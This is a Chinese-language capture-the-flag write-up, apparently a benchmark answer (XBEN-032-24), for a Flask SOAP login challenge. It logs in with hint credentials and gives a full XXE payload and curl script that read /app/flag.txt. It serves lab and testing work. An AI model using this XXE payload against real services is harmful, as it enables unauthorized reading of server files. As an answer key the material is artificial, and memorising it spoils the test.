vulnerables/exploit/XBEN-032-24/032.md

## 题目描述

Try to login as the admin user, you will need to dump the admins table

## 知识点

* **Type:** XXE (XML External Entity) 攻击
* **Category:** Injection
* **Framework:** Python Flask/Werkzeug
* **Additional:** SOAP服务、身份认证绕过

## 解题方法思路

页面发现登录功能，使用提示中的凭证（john/password123）登录系统，获得JWT token后访问dashboard。发现SOAP服务端点存在XXE漏洞，通过构造恶意XML请求读取系统文件/app/flag.txt获取flag。

关键攻击向量：
- 身份认证：使用提示中的弱密码
- 权限提升：从普通用户权限提升到管理员功能
- 漏洞利用：XXE漏洞读取系统文件

## 解题步骤

### 1. 初始侦察
访问目标URL：<TARGET_URL>
发现登录页面和技术栈：Python 3.8.20 + Werkzeug 3.0.6（Flask应用）

### 2. 身份认证
使用CTF提示提供的凭证登录：
- 用户名：john
- 密码：password123

登录成功后获得JWT token并重定向到dashboard页面。

### 3. 功能发现
在dashboard页面中发现SOAP服务调用功能，分析页面结构和JavaScript代码，找到SOAP服务端点：`/soap_service`

### 4. XXE漏洞测试
构造恶意XML请求测试SOAP服务是否存在XXE漏洞：

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://192.168.32.29:80/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:getData>
         <web:username>&xxe;</web:username>
      </web:getData>
   </soapenv:Body>
</soapenv:Envelope>
```

### 5. 获取Flag
发送XXE攻击请求，成功读取`/app/flag.txt`文件内容，获得flag。

## exp

**注意：请将 `<TARGET_URL>` 替换为实际的目标URL，如 http://example.com:8080**

```bash
# 1. 登录获取JWT token
curl -X POST <TARGET_URL>/login \
  -d "username=john&password=password123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt

# 2. 使用JWT token访问dashboard
curl -X GET <TARGET_URL>/dashboard \
  -b cookies.txt

# 3. 发送XXE攻击请求读取flag
curl -X POST <TARGET_URL>/soap_service \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:getData>
         <web:username>&xxe;</web:username>
      </web:getData>
   </soapenv:Body>
</soapenv:Envelope>'
```

**最终获取到flag**